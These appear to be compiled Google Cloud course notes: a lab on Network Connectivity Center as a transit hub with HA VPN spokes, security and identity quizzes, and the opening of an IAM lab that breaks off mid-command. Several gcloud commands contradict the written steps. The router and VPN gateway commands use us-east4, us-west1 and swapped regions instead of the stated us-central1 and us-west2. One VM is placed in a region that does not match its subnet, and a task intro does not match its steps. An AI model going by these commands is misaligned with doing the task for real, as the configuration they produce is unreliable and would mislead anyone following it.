**Note:** You can also SSH into the virtual machine. Learn more about SSH from the [Connect to an instance using ssh documentation](https://cloud.google.com/compute/docs/instances/connecting-to-instance).



![Command line terminal](images/akxcwUSd1Af5FWejHAEaGAtsp7WZTFSKeWVZACNC0Zk%3D.png)

1. Run a ping test from **vpc-a-vm-1** to the internal IP of **vpc-b-vm-1**.
2. You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.

```
ping -c 5 <INTERNAL_IP_OF_VPC-B-VM-1>
```



![Command line terminal displaying ping statistics](images/JYccSGxzzFSU163WJCBgHq8wtgGuqfSlXSKKmGtsyaw%3D.png)

#### Congratulations!

This completes our lab for the Network Connectivity Center as a Transit hub with HA VPNs as spokes.



### Configuring Network Connectivity Center as a Transit Hub

#### Overview

Network Connectivity Center (NCC) enables connecting different enterprise networks together that are outside of Google Cloud by leveraging Google's network—providing enterprises instant access to planet-scale reach and high reliability. Traffic between non-Google networks is referred to as data transfer traffic, which can occur using existing standard cloud network connectivity resources such as Cloud VPN, Dedicated or Partner Interconnect.

In this lab, you will go through the process of setting up NCC as a transit hub to route traffic between two non-Google networks using Google's backbone network.

#### Architecture

NCC consists of hub and spoke resources.

**Hub**

A hub is a global Google Cloud resource that supports multiple attached spokes. It provides a simple way to connect spokes together to enable data transfer across them. A hub can provide data transfer between different on-premises locations and a Virtual Private Cloud (VPC) network through its attached spokes.

**Spoke**

A spoke is a Google Cloud network resource connected to a hub. It is part of the hub, and can't be created without creating the hub first. A spoke routes traffic to remote network address blocks and enables the connection of multiple remote networks.

Spokes can be of one of the following types:

- HA VPN tunnels
- VLAN attachments
- Router appliance instances that you or select partners deploy within Google Cloud

The following network topology is similar to a typical customer deployment having branch offices located in two geographically separate locations. For this lab, you are simulating two VPCs *vpc-a*, and *vpc-b* in `us-central1`, and `us-west2` as the branch offices respectively.

The branch offices are connected to a VPC, *vpc-transit*, which is a central hub terminating a pair of HA VPNs. These VPNs are configured in a region closest to the branch offices. In the real world, these VPNs could be replaced using Interconnects.

You will configure the NCC hub in the *vpc-transit* network, and the two remote branch offices will be connected using the HA VPN tunnels as spokes.

![Network topology project example](images/9k3iu618o9ppsU1nO%2FJRRX17rCFJCu%2BMp33J%2FtJ1C9o%3D.png)

In this lab, you will achieve the following objectives:

1. Create a hub VPC called *vpc-transit*.
2. Create two remote branch office VPCs namely *vpc-a* and *vpc-b*.
3. Create HA VPN from *vpa-a* to *vpc-transit*, and *vpc-b* to *vpc-transit*.
4. Create a NCC hub resource and attach the HA VPNs as spokes.
5. Test the setup end to end deploying VMs in the remote branch office VPCs.

#### Prerequisites

- Basic knowledge of Google VPC Networking, and Compute Engine.
- It is helpful to have completed the [Networking 101](https://google.qwiklabs.com/catalog_lab/311) and [VPC Networking: Cloud HA-VPN](https://www.qwiklabs.com/focuses/6270?parent=catalog) labs.

#### Task 1. Create vpc-transit

1. In the Google Cloud Console, in the top-right toolbar, click the **Activate Cloud Shell** button and run the following command to delete the **default** network.

![Cloud Shell icon](images/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D.png)

```
gcloud compute networks delete default
```



1. In the Google Cloud Console, from the **Navigation Menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))**, go to **VPC network**.
2. Click **CREATE VPC NETWORK**.
3. Enter a Name for the network: **vpc-transit**.
4. You do not need to create a subnet for the *vpc-transit* so click **Delete** next to New Subnet.
5. Choose the Dynamic routing mode for the VPC network as **Global**.

**Note:** Learn more about dynamic routing from the [dynamic routing mode documentation](https://cloud.google.com/vpc/docs/vpc#routing_for_hybrid_networks).

1. Click **Create**.

Click *Check my progress* to verify the objective.

Create vpc-transit network



Check my progress



#### Task 2. Create remote branch office VPCs

1. In the Google Cloud Console, from the **Navigation menu**, go to the **VPC network**.
2. Click **CREATE VPC NETWORK**.
3. Enter a Name for the network as **vpc-a**.
4. Choose **Custom** for the Subnet creation mode.
5. In the New subnet section, specify the following configuration parameters for a subnet:
   - Name for the subnet: **vpc-a-sub1-use4**.
   - Region: **`us-central1`**.
   - IP address range **10.20.10.0/24**. This is the primary IP range for the subnet.
6. Click **Done**.
7. Choose the Dynamic routing mode for the VPC network as **Regional**.
8. Click **Create**.
9. To add the second remote branch office VPC, click **CREATE VPC NETWORK**.
10. Enter a Name for the network as **vpc-b**.
11. Choose **Custom** for the Subnet creation mode.
12. In the New subnet section, specify the following configuration parameters for a subnet:
13. Provide a Name for the subnet as **vpc-b-sub1-usw2**.
14. Select Region as **`us-west2`**.
15. Enter an IP address range **10.20.20.0/24**.
16. Click **Done**.
17. Choose the Dynamic routing mode for the VPC network as **Regional**.
18. Click **Create**.

Now you should be able to view all 3 VPCs in the VPC networks console like this:

![VPC networks console displaying VPCs](images/Pb5gdQp%2B93LD4uC3K0KTB6v1mhwNz5Rst6YH1k5UTzc%3D.png)

Click *Check my progress* to verify the objective.

Create remote branch office VPCs namely vpc-a and vpc-b



Check my progress



#### Task 3. Configure HA VPN between the remote branch office VPCs and the transit hub VPC

**Note:** In this lab you are simulating the remote branch offices as Google Cloud VPCs, therefore using the steps listed to [Create HA VPN between Google Cloud Networks](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn2).



For any practical implementation, you may replace the steps listed below with the steps for [Creating an HA VPN gateway to a peer VPN gateway](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn) if you are using HA VPNs to connect to your branch offices.

In this section you will configure an HA VPN between the remote branch office VPCs (*vpc-a* and *vpc-b*) and the transit hub VPC (*vpc-transit*). HA VPN uses BGP for dynamically exchanging routes between Google Cloud and the peer network. Before configuring the HA VPNs, you need to create Cloud Routers associated with each VPC network.

**Note:** Learn more about Cloud Routers [in the Cloud Router overview documentation](https://cloud.google.com/network-connectivity/docs/router/concepts/overview).

##### **Step 1: Create cloud routers**

To create a new Cloud Router for each VPC, specify the following:

1. In the Cloud Console, from the **Navigation menu**, go to **Network Connectivity** and select **Cloud Routers**.
2. Click **Create router**.
3. Enter name as **cr-vpc-transit-use4-1**.
4. Select the network as **vpc-transit**.
5. Select the region as **`us-central1`**.
6. Enter the **ASN** as **65000**.
7. Select **Advertise all subnets visible to the Cloud Router (Default)**.
8. Click **Create**.
9. Use the steps mentioned above to create additional cloud routers using the following details:

| **Cloud Router name**   | **VPC Network** | **Region**    | **Google ASN** |
| ----------------------- | --------------- | ------------- | -------------- |
| *cr-vpc-transit-usw2-1* | vpc-transit     | `us-west2`    | 65000          |
| *cr-vpc-a-use4-1*       | vpc-a           | `us-central1` | 65001          |
| *cr-vpc-b-usw2-1*       | vpc-b           | `us-west2`    | 65002          |

```
gcloud compute routers create cr-vpc-transit-use4-1 \
    --region us-east4 \
    --network vpc-transit \
    --asn 65000

gcloud compute routers create cr-vpc-transit-usw2-1 \
    --region us-west2 \
    --network vpc-transit \
    --asn 65000


gcloud compute routers create cr-vpc-a-use4-1 \
    --region us-east4 \
    --network vpc-a \
    --asn 65001


gcloud compute routers create cr-vpc-b-usw2-1 \
    --region us-west2 \
    --network vpc-b \
    --asn 65002
```





##### **Step 2: Create HA VPN gateways**

Create an HA VPN gateway in the *vpc-transit* network for `us-central1` region, using the following steps:

1. From the **Navigation menu**, go to **Network Connectivity** and select **VPN**.
2. Click **Create VPN connection**.
3. Select **High-availability (HA) VPN**.
4. Click **Continue**.
5. Specify a VPN gateway name as **vpc-transit-gw1-use4**.
6. Under the VPC network, select **vpc-transit**.
7. Select a Region as **`us-central1`**.
8. Click **Create and continue**.

**Note:** Before adding VPN tunnels, you need to create additional VPN gateways.

1. From the VPN page, select **Cloud VPN Gateways**.
2. Click **Create VPN gateway** and enter the following details to create the additional VPN gateways:

| **VPN gateway name**   | **VPC Network** | **Region**    |
| ---------------------- | --------------- | ------------- |
| *vpc-transit-gw1-usw2* | vpc-transit     | `us-west2`    |
| *vpc-a-gw1-use4*       | vpc-a           | `us-central1` |
| *vpc-b-gw1-usw2*       | vpc-b           | `us-west2`    |

```
gcloud compute vpn-gateways create vpc-transit-gw1-use4 \
   --network=vpc-transit \
   --region=us-west1 


gcloud compute vpn-gateways create vpc-transit-gw1-usw2 \
   --network=vpc-transit \
   --region=us-central1


gcloud compute vpn-gateways create vpc-a-gw1-use4 \
   --network=vpc-a \
   --region=us-west1 

gcloud compute vpn-gateways create vpc-b-gw1-usw2 \
   --network=vpc-b \
   --region=us-central1
```



Click *Check my progress* to verify the objective.

Create cloud routers and HA VPN gateways



Check my progress



##### **Step 3: Create a pair of VPN tunnels between vpc-transit to vpc-a**

###### Add VPN tunnels from vpc-transit to vpc-a

Create a pair of VPN tunnels using the following steps:

1. From the VPN page, click on **Cloud VPN Gateways** and select **vpc-transit-gw1-use4**.
2. Click to **Add VPN tunnel**.
3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
4. Select the **Project Id** associated with the lab.
5. Select the remote VPN gateway, **vpc-a-gw1-use4**.
6. For high availability, select **Create a pair of VPN tunnels**.
7. Select the Cloud Router **cr-vpc-transit-use4-1**.
8. Click on the VPN tunnel to enter the tunnel details:
   - The Cloud VPN and the associated peer VPN gateway interface information should be pre-populated
   - Name: **transit-to-vpc-a-tu1**
   - IKE version: IKEv2
   - IKE pre-shared key: **gcprocks**
9. Click **Done**.
10. Repeat steps for the second tunnel:
    - Name: **transit-to-vpc-a-tu2**
    - IKE version: IKEv2
    - IKE pre-shared key: **gcprocks**
11. Click **Done**.
12. Click **Create & Continue**.

###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-a

The next step is to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu1*

1. Click

    

   Configure BGP Session for transit-to-vpc-a-tu1

   :

   - BGP session name: **transit-to-vpc-a-bgp1**
   - Peer ASN: **65001**
   - Allocate BGP IPv4 address: *Manually*
   - Cloud Router BGP IPv4 address: **169.254.1.1**
   - BGP peer IPv4 address: **169.254.1.2**

2. Click **Save and continue**.

- Repeat steps to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu2*.

1. Click **Configure BGP Session for transit-to-vpc-a-tu2**:

- BGP session name: **transit-to-vpc-a-bgp2**
- Peer ASN: **65001**
- Allocate BGP IPv4 address: *Manually*
- Cloud Router BGP IPv4 address: **169.254.1.5**
- BGP peer IPv4 address: **169.254.1.6**

1. Click **Save and continue**.
2. Click on **Save BGP configuration**.
3. Click **OK**.

###### Add VPN tunnels from vpc-a to vpc-transit

Now create a pair of VPN tunnels from the *vpc-a* to *vpc-transit* to complete the bidirectional tunnel configuration using the following steps:

1. From the VPN page, select **Cloud VPN Gateways** *vpc-a-gw1-use4*:
2. Click to **Add VPN tunnel**.
3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
4. Select the **Project Id** associated with the lab.
5. Select the remote VPN gateway, **vpc-transit-gw1-use4**
6. For high availability, select **Create a pair of VPN tunnels**.
7. Select the Cloud Router, **cr-vpc-a-use4-1**
8. Click on the VPN tunnel to enter the tunnel details:
   - The Cloud VPN and peer VPN gateway interface information should be pre-populated.
   - Name: **vpc-a-to-transit-tu1**
   - IKE version: IKEv2
   - IKE pre-shared key: **gcprocks**
9. Click **Done**.
10. Repeat steps for the second tunnel:
    - Name: **vpc-a-to-transit-tu2**
    - IKE version: IKEv2
    - IKE pre-shared key: **gcprocks**
11. Click **Done**.
12. Click **Create & Continue**.

###### Add BGP sessions for each VPN tunnel configured from vpc-a to vpc-transit

The next step is to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu1*

1. Click

    

   Configure BGP Session for vpc-a-to-transit-tu1

   - BGP session name: **vpc-a-to-transit-bgp1**
   - Peer ASN: **65000**
   - Allocate BGP IPv4 address: *Manually*
   - Cloud Router BGP IPv4 address: **169.254.1.2**
   - BGP peer IPv4 address: **169.254.1.1**

2. Click **Save and continue**.

Repeat steps to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu2*

1. Click

    

   Configure BGP Session for vpc-a-to-transit-tu2

   - BGP session name: **vpc-a-to-transit-bgp2**
   - Peer ASN: **65000**
   - Allocate BGP IPv4 address: *Manually*
   - Cloud Router BGP IPv4 address: **169.254.1.6**
   - BGP peer IPv4 address: **169.254.1.5**

2. Click **Save and continue**.

3. Click on **Save BGP configuration**.

4. Click **OK**.

Once this step is complete the VPN tunnel status should reflect *Established* and BGP status should reflect *BGP established*.

##### **Step 4: Create a pair of VPN tunnels between vpc-transit to vpc-b**

- Repeat steps listed above (step 3) to create the bidirectional HA VPN tunnels between the vpc-transit and vpc-b networks using the details below.

###### Add VPN tunnels from vpc-transit to vpc-b

| Peer VPN gateway name | *vpc-b-gw1-usw2*        |
| --------------------- | ----------------------- |
| Cloud Router          | *cr-vpc-transit-usw2-1* |
| VPN tunnel one        | *transit-to-vpc-b-tu1*  |
| Pre-shared key        | *gcprocks*              |
| VPN tunnel two        | *transit-to-vpc-b-tu2*  |
| Pre-shared key        | *gcprocks*              |

###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-b

BGP session for tunnel *transit-to-vpc-b-tu1* :

| BGP session                   | *transit-to-vpc-b-bgp1* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65002*                 |
| Cloud Router BGP IPv4 address | 169.254.1.9             |
| BGP peer IPv4 address         | 169.254.1.10            |

BGP session for tunnel *transit-to-vpc-b-tu2* :

| BGP session                   | *transit-to-vpc-b-bgp2* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65002*                 |
| Cloud Router BGP IPv4 address | 169.254.1.13            |
| BGP peer IPv4 address         | 169.254.1.14            |

###### Add VPN tunnels from vpc-b to vpc-transit

| Peer VPN gateway name | *vpc-transit-gw1-usw2* |
| --------------------- | ---------------------- |
| Cloud Router          | *cr-vpc-b-usw2-1*      |
| VPN tunnel one        | *vpc-b-to-transit-tu1* |
| Pre-shared key        | *gcprocks*             |
| VPN tunnel second     | *vpc-b-to-transit-tu2* |
| Pre-shared key        | *gcprocks*             |

###### Add BGP sessions for each VPN tunnel configured from vpc-b to vpc-transit

BGP session for tunnel *vpc-b-to-transit-tu1* :

| BGP session                   | *vpc-b-to-transit-bgp1* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65000*                 |
| Cloud Router BGP IPv4 address | 169.254.1.10            |
| BGP peer IPv4 address         | 169.254.1.9             |

BGP session for tunnel *vpc-b-to-transit-tu2* :

| BGP session                   | *vpc-b-to-transit-bgp2* |
| ----------------------------- | ----------------------- |
| Peer ASN                      | *65000*                 |
| Cloud Router BGP IPv4 address | 169.254.1.14            |
| BGP peer IPv4 address         | 169.254.1.13            |

##### **Step 5: Verify the all the VPN connections status from the VPN page**

- Scroll down the page to confirm that all connections are good.

![VPN page with all VPN tunnel statuses displaying Established and Bgp session statuses displaying BGP established](https://cdn.qwiklabs.com/QBF07Zii%2ByXoSqxQJHLbXtBlApXTpiIeZTYsGZVP1rU%3D)

Click *Check my progress* to verify the objective.

Create a pair of VPN tunnels between vpc-transit to vpc-a and vpc-b



Check my progress



#### Task 4. Create NCC hub resources and attach the HA VPNs as spokes

In this section you will create a VPC and create 2 subnets inside that VPC. This will all be done using gcloud CLI commands inside Google Cloud Shell.

Before you can perform any tasks for Network Connectivity Center, you must enable the Network Connectivity API.

1. From the **Navigation Menu**, search for **API & Services**.
2. Click on **Library**, and search for **Network Connectivity API**.
3. Select the **Network Connectivity API**.

![Network Connectivity API option highlighted in the search results](images/hyB14LnLTAnovI6IC9wDMAoNbXT77qxEZyNIzXnww9Q%3D.png)

1. Click **Enable**.
2. In this lab `gcloud` commands are used to configure the Network Connectivity Center. In order to authorize Cloud Shell to run the gcloud commands, open the Google Cloud Shell by clicking **Activate Cloud Shell**(![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)).
3. Run the following command to list the active account name:

```
gcloud auth list
```



1. Click **Authorize**.

##### Step 1: Create NCC hub

- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:

```
gcloud alpha network-connectivity hubs create transit-hub \
   --description=Transit_hub
```



##### Step 2: Create the spoke for branch office 1

- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents:

```
gcloud alpha network-connectivity spokes create bo1 \
    --hub=transit-hub \
    --description=branch_office1 \
    --vpn-tunnel=transit-to-vpc-a-tu1,transit-to-vpc-a-tu2 \
    --region=us-central1
```



##### Step 3: Create the spoke for branch office 2

- You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.

```
gcloud alpha network-connectivity spokes create bo2 \
    --hub=transit-hub \
    --description=branch_office2 \
    --vpn-tunnel=transit-to-vpc-b-tu1,transit-to-vpc-b-tu2 \
    --region=us-west2
```



Click *Check my progress* to verify the objective.

Create NCC hub resources and attach the HA VPNs as spokes



Check my progress



#### Task 5. Test the setup end to end deploying VMs in the remote branch office VPCs

After configuring the hub and its spokes, you should be able to pass traffic from the virtual machine (VM) instance in *branch office1* to the VM instance in *branch office2*. To do this, create a *vpc-a-vm-1* in *vpc-a* and vpc-b-vm-1 in *vpc-b* respectively.

First, create firewall rules: *fw-a* for *vpc-a-vm-1* in *vpc-a-sub1-use4* subnet and *fw-b* for *vpc-b-vm-1* in *vpc-b-sub1-usw2* subnet respectively to allow ingress SSH and ICMP traffic.

![Network topology project screen](images/o5dZVa%2Byv8W3ZZA%2F44UUwlMUXClCGuSQhpERepDFpGI%3D.png)

##### Step 1: Create Firewall rule for vpc-a

1. In the Cloud Platform Console, click **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)) at the top left of the screen.
2. Then navigate to **VPC network** > **Firewall**.
3. Click on **CREATE FIREWALL RULE** and specify the details as shown.

![Firewall Rule Creation](images/zau55jMGfANEcN6iYWMuSz8iCdjBuUPyY4yr9dbi2wA%3D.png) ![Firewall Rule Creation](images/sYV7SXfm3cPA1o%2BCqRqq%2BYnJ%2FvWaFhMl03VXNFETmMk%3D.png)

1. Similarly, create firewall rule **fw-b** for **vpc-b**.

##### Step 2: Create VM in vpc-a

1. In the **Cloud console**, on the **Navigation menu** (☰), click **Compute Engine** > **VM Instances**, then click **Create instance**.

**Note:** This may take a minute to initialize for the first time.

There are many parameters you can configure when creating a new instance. Use the following for this lab:

1. In the **Machine configuration**

   Enter the values for the following fields:

   | Field       | Value           |
   | :---------- | :-------------- |
   | **Name**    | `vpc-a-vm-1`    |
   | **Region**  | `us-central1`   |
   | **Zone**    | `us-central1-c` |
   | **Series**  | `E2`            |
   | **Machine** | `e2-medium`     |

2. Click **OS and storage**

   Click **Change** to begin configuring your boot disk and select the values for:

   | Field                | Value                                   |
   | :------------------- | :-------------------------------------- |
   | **Operating system** | `Debian`                                |
   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
   | **Boot disk type**   | `balanced persistent disk`              |
   | **Size (GB)**        | `10 GB`                                 |

3. Click **Networking**

   - Network interfaces

      

     : click on

      

     ```
     default
     ```

      

     to edit.

     - **Network**: `vpc-a`
     - **Subnetwork**: `vpc-a-sub1-use4`

4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.

**Note:** The instance creation process is asynchronous. You can check on the status of the task using the top right-hand side **Activities** icon. Wait for it to finish - it shouldn't take more than a minute.

**Note:** If you receive an error when creating a VM, click into **Details**. Most likely you need to try again with a different zone.

Once finished, you should see the new virtual machine in the **VM Instances** page.

Similarly, create another VM in **vpc-b** using the following parameters:

1. In the **Machine configuration**

   Enter the values for the following fields:

   | Field       | Value           |
   | :---------- | :-------------- |
   | **Name**    | `vpc-b-vm-1`    |
   | **Region**  | `us-central1`   |
   | **Zone**    | `us-central1-c` |
   | **Series**  | `E2`            |
   | **Machine** | `e2-medium`     |

2. Click **OS and storage**

   Click **Change** to begin configuring your boot disk and select the values for:

   | Field                | Value                                   |
   | :------------------- | :-------------------------------------- |
   | **Operating system** | `Debian`                                |
   | **Version**          | `Debian GNU/Linux 11 (bullseye) x86/64` |
   | **Boot disk type**   | `balanced persistent disk`              |
   | **Size (GB)**        | `10 GB`                                 |

3. Click **Networking**

   - Network interfaces

      

     : click on

      

     ```
     default
     ```

      

     to edit.

     - **Network**: `vpc-b`
     - **Subnetwork**: `vpc-b-sub1-usw2`

4. Once all sections are configured, scroll down and click **Create** to launch your virtual machine instance.

Once finished, you should see the two virtual machines in the **VM Instances** page.

1. Copy the internal IP of **vpc-b-vm-1**.

![IP address of vpc-b-vm-1 highlighted on the VM Instances page](images/1uljy8fJ3Z9PN3q9BV9%2F9GVKxp9YygA8rVHPQIXdQuU%3D.png)

Click *Check my progress* to verify the objective.

Create VMs in the remote branch office VPCs



Check my progress



##### Step 3: Run the ping command and verify connectivity to bo2 via NCC transit

To verify the end to end connectivity, run a ping test between *vpc-a-vm-1* and *vpc-b-vm-1* using the following steps:

1. SSH into **vpc-a-vm-1** by clicking on **SSH** on the right hand side of vpc-a-vm-1. This launches a SSH client directly from your browser.

**Note:** You can also SSH into the virtual machine. Learn more about SSH from the [Connect to an instance using ssh documentation](https://cloud.google.com/compute/docs/instances/connecting-to-instance).



![Command line terminal](images/akxcwUSd1Af5FWejHAEaGAtsp7WZTFSKeWVZACNC0Zk%3D.png)

1. Run a ping test from **vpc-a-vm-1** to the internal IP of **vpc-b-vm-1**.
2. You can click on the "clipboard" icon in the upper right corner of the text box to copy the contents.

```
ping -c 5 <INTERNAL_IP_OF_VPC-B-VM-1>
```



![Command line terminal displaying ping statistics](images/JYccSGxzzFSU163WJCBgHq8wtgGuqfSlXSKKmGtsyaw%3D.png)

#### Congratulations!

This completes our lab for the Network Connectivity Center as a Transit hub with HA VPNs as spokes.



## Quiz

1. What is the purpose of a Cloud Router, and why is that important?

- To load balance traffic across multiple Google Cloud regions and zones.
- To dynamically exchange routing information using BGP between Google Cloud VPCs and other networks.
- To create and manage virtual private networks (VPNs) between on-premises networks and Google Cloud.
- To filter and restrict traffic based on predefined security rules.

This is correct. Cloud Router enables dynamic routing using BGP,  allowing Google Cloud VPCs to learn routes from on-premises networks and other cloud environments.

2. In Network Connectivity Center, what are the two main types of spokes that can be connected to a hub?

- Regional spokes and Global spokes              
- VPC spokes and Global spokes              
- Global spokes and Hybrid spokes              
- VPC spokes and Hybrid spokes

Correct. VPC Spokes and hybrid spokes are two types of Network Connectivity Center spokes



# 09 Managing Security in Google Cloud

## Foundations of Google Cloud Security

### Quiz

1. Which TWO of the following statements are TRUE regarding regulatory compliance on Google Cloud?

- Contacting your regulatory compliance certification agency is the only way to find out whether Google currently supports that particular standard.

- **Google's Cloud products regularly undergo independent verification of security, privacy, and compliance controls.**

​	Correct! Google works to achieve certifications against global standards so we can earn your trust.

- Google has no plans at this time to expand its already-extensive portfolio of regulatory compliance certifications.

- **Proper configuration of encryption and firewalls is not the only requirement for achieving regulatory compliance.**

  Correct! You also need data protection that is in compliance with the regulatory standards you wish to meet.

  

2. For Platform-as-a-Service (PaaS) offerings, which of the following is NOT a customer-managed component of the shared security responsibility model?

- **Network security**

  Correct! Network security is customer-managed for Infrastructure-as-a-Service (IaaS) offerings. This is Google-managed for Platform-as-a-Service (PaaS) offerings.

- Web application security

- Access policies

- Deployment




3. Which ONE of the following statements is TRUE concerning Google's built-in security measures?

- An organization's on-premises resources are not allowed to connect to Google Cloud in order to lower the risk of DDoS attacks.
- Customers always have the option to configure their instances to encrypt all of their data while it is "at rest" within Google Cloud.
- **To guard against phishing attacks, all Google employee accounts require the use of U2F compatible security keys.**

​	Correct! Google's internal security measures go beyond asking employees for a simple username and 	password.

- Only Google-managed encryption keys are allowed to be used within Google Cloud.




4. Which of the following statements is TRUE regarding Shared Security Responsibility Model in Google Cloud?

- **It is a shared responsibility between the customer and Google.**
- The customer is responsible for the complete stack including application security and access control.
- Google is responsible for the complete stack including application security and access control.

Correct! The customer is responsible for everything brought into the cloud as well as access management, the appropriate configuration of firewalls, app security, etc. Google is responsible for the security of the cloud (i.e. the underlying layer).



## Securing Access to Google Cloud

### Quiz

1. Which TWO of the following are considered authentication "best practices?"

- Requiring 2-Step Verification (2SV) is only recommended for super-admin accounts.
- **Avoid managing permissions on an individual user basis where possible.**

Correct! Assigning users to groups and giving the group role-based permissions is much easier to manage.

- Organization Admins should never remove the default Organization-level permissions from users after account creation.
- **You should have no more than three Organization admins.**

Correct! Too many admins can create additional risk as well - the general advice is no more than three admins per organization.

2. Which of the following statements is TRUE for the use of Cloud Identity?

- **Cloud Identity can work with any domain name that is able to receive email.**
- Your organization must use Google Workspace services in order to use Cloud Identity.
- You cannot use both Cloud Identity and Google Workspace services to manage your users across your domain.
- A Google Workspace or Cloud Identity account can be associated with more than one Organization.

Correct! You do not have to use Google Workspace services to use the Cloud Identity Free edition.


3. The main purpose of Google Cloud Directory Sync is to: (choose ONE option below)

- **Help simplify provisioning and de-provisioning user accounts.**
- Completely replace an Active Directory or LDAP service.
- Enable two-way data synchronization between Google Cloud and AD/LDAP accounts.

Correct! Managing user accounts manually can be tedious and time-consuming when an organization has many users.



## Identity and Access Management (IAM)

### LAB - Configuring IAM

#### Overview

In this lab, you will configure [Identity and Access Management (IAM)](https://cloud.google.com/iam) to grant roles and create custom roles. IAM lets you create and manage permissions for Google Cloud resources. IAM unifies access control for Google Cloud services into a single system and presents a consistent set of operations.

#### Objectives

In this lab, you will learn how to:

- Use IAM to implement access control.
- Restrict access to specific features or resources.
- Use predefined roles to provide Google Cloud access.
- Create custom IAM roles to provide permissions based on your own job roles.
- Modify custom roles.

#### Setup and requirements

For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.

1. Sign in to Qwiklabs using an **incognito window**.
2. Note the lab's access time (for example, `1:15:00`), and make sure you can finish within that time.
   There is no pause feature. You can restart if needed, but you have to start at the beginning.
3. When ready, click **Start lab**.
4. Note your lab credentials (**Username** and **Password**). You will use them to sign in to the Google Cloud Console.
5. Click **Open Google Console**.
6. Click **Use another account** and copy/paste credentials for **this** lab into the prompts.
   If you use other credentials, you'll receive errors or **incur charges**.
7. Accept the terms and skip the recovery resource page.

**Note:** Do not click **End Lab** unless you have finished the lab or want to restart it. This clears your work and removes the project.

#### Task 1. Sign in with two user accounts

In this task, you sign in using two different user accounts. These accounts are used later in the lab to explore IAM access to specific resources.

##### Sign in to the Google Cloud Console as the first user

For this lab, Qwiklabs has provisioned you with two user names available in the **Connection Details** dialog.

1. Use a Chrome incognito window and sign in to the [Cloud Console](https://console.cloud.google.com/) with the **Username 1** provided in Qwiklabs. Note that both usernames use the same password.
2. Accept the Terms and Conditions for your temporary Google account.
3. Because this is a temporary account, do not add recovery option data or sign up for free trials.
4. When prompted, accept the Terms and Conditions for Google Cloud.

##### Sign in to the Cloud Console as the second user

1. Open another browser tab in your incognito window.
2. Browse to the [Cloud Console](https://console.cloud.google.com/).
3. Click on the user icon in the top-right corner of the screen, and then click **Add account**.
4. Sign in to the Cloud Console with the **Username 2** provided in Qwiklabs.

**Note:** At some points in this lab, if you sign out of the **Username 1** account, the **Username 2** account is deleted by Qwiklabs. So be sure to remain signed in to **Username 1**.

#### Task 2. Explore current roles in the IAM console

In this task, you explore the current roles for Username 1 and Username 2.

##### Navigate to the IAM console and explore roles

Make sure you are on the **Username 1** Cloud Console tab.

1. To view the **IAM** console, in the **Navigation menu**, click **IAM & admin > IAM**.
2. In the IAM console, locate the line for **Username 1**. Note that Username 1 has a few roles, including Project **Owner**.
3. Locate the line for **Username 2**. Note that Username 2 has a Project **Viewer** role.

**Note:** In the next three steps, be sure **NOT** to change any of the permissions. You will use the edit feature just to view the roles assigned.

1. Click the Edit principal button ![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D) on the line for **Username 2**.
2. Click **Viewer** to expand the list of possible roles. Do not change any of the roles yet, but you do have permissions to do so because Username 1 is project owner.
3. Click outside the role list to collapse it, and then click **Cancel**.
4. Switch to the Cloud Console tab for **Username 2**.
5. On the **Navigation menu**, click **IAM & admin > IAM**.
6. Click the Edit principal button ![Edit icon](https://cdn.qwiklabs.com/zxK8nW520maN72Qq6D1Lt9gCeDh7QOMGWCwhny5S8sQ%3D) on the line for **Username 2**. You will not be able to edit the role. **Username 2** currently has access to view the project (Project Viewer), but does not have permissions to change anything.

#### Task 3. Prepare a resource for access testing

In this task, you create a Cloud Storage bucket and a sample text file. You test access to the sample file using Username 2.

##### Create a bucket and upload a sample file

1. Switch to the **Username 1** Cloud Console tab.
2. On the Google Cloud Console title bar, click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)). If prompted, click **Continue**.
3. Run the following command to create a new storage bucket in `REGION`:

```
gcloud storage buckets create -l Region gs://$DEVSHELL_PROJECT_ID
```



1. Run the following command to create a sample text file in your Cloud Shell:

```
echo "this is a sample file" > sample.txt
```



1. Run the following command to copy the file to the bucket just created:

```
gcloud storage cp sample.txt gs://$DEVSHELL_PROJECT_ID
```



Click *Check my progress* to verify the objective.

Prepare a resource for access testing



Check my progress



##### Verify the Project Viewer role access

1. Switch to the **Username 2** Cloud Console tab.
2. Click **Activate Cloud Shell** (![Activate Cloud Shell icon](https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D)) to open Cloud Shell. If prompted, click **Continue**.
3. Run the following command to verify that **Username 2** can view the file in the bucket:

```
gcloud storage ls gs://$DEVSHELL_PROJECT_ID
```



1. Run the following commands to create a file and try to upload it to the bucket:

```
echo "this is another file" > sample2.txt
